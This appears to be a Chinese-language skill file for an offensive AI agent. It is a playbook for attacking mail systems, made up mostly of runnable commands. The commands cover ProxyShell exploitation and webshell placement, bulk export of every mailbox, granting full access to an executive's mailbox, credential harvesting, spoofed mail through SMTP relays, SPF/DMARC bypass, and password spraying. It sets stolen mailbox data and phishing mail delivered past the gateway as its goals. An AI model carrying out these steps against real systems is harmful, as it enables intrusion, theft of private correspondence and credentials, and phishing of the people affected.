---
name: mail-system-attack
description: 邮件系统攻击：Exchange/OWA 漏洞链（ProxyShell 后续利用与邮箱导出）、邮箱权限横向、SMTP 中继滥用、SPF/DKIM/DMARC 绕过、IMAP 凭据爆破
whenToUse: 目标有自建邮件系统（Exchange/Postfix/Zimbra）；需要从邮件侧进入内网；需要让钓鱼邮件穿过目标网关
role: vuln-scan
enabled: true
---

# 邮件系统攻击（Exchange / SMTP / 反垃圾绕过）

红线：拿到邮箱数据、SMTP 中继可用，或邮件成功穿过目标网关。

## 一、指纹与暴露面

~~~
nmap -sV -p25,110,143,443,465,587,993,995 MAIL_HOST
curl -sk https://MAIL_HOST/owa/ | grep -iE 'exchange|owa|outlook'
curl -sk https://MAIL_HOST/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application | head -20
~~~

## 二、Exchange 漏洞链

~~~
# ProxyShell 探测（Autodiscover 泄漏）
curl -sk "https://MAIL_HOST/autodiscover/autodiscover.json?@x=/mapi/nspi/&Email=autodiscover/autodiscover.json%3f@x" -o /dev/null -w '%{http_code}'
# 拿到 RCE 后 webshell 落在 /aspnet_client/ 或 /owa/auth/
python3 proxyshell.py -u https://MAIL_HOST --shell
~~~

拿到 iis apppool 权限后，用 Exchange PowerShell 导出全员邮箱：

~~~
Get-Mailbox | ForEach-Object { New-MailboxExportRequest -Mailbox $_.Alias -FilePath "\\127.0.0.1\c$\ex\$($_.Alias).pst" }
~~~

## 三、邮箱权限横向

~~~
Get-MailboxPermission -Identity victim        # 查谁有 FullAccess
Add-MailboxPermission -Identity ceo -User me -AccessRights FullAccess
Invoke-GlobalO365CredentialHarvest            # MFA 环境下的凭据猎取
~~~

## 四、SMTP 中继

~~~
swaks --to victim@external.com --from ceo@corp.com --server MAIL_HOST:25
swaks --to target --from x@corp.com --server MAIL_HOST:587 --auth LOGIN --auth-user u --auth-password p
~~~

## 五、SPF / DKIM / DMARC 绕过

~~~
dig TXT corp.com | grep -i spf
dig TXT _dmarc.corp.com
~~~

常见路径：SPF 软失败（~all）不拒收；子域未配 SPF；相似域（corp-mail.com）；用目标自己的 SMTP 中继发信。

## 六、凭据爆破（限速）

~~~
hydra -L users.txt -p 'Summer2026!' imap://MAIL_HOST -s 993 -S -t 2 -W 3
Invoke-PasswordSprayOWA -ExchHostname MAIL_HOST -UserList users.txt -Password 'Winter2026!'
~~~

## 衔接

邮箱数据 → data-exfiltration / osint-social；凭据 → credential-attack / lateral-movement；投递话术 → phishing-delivery
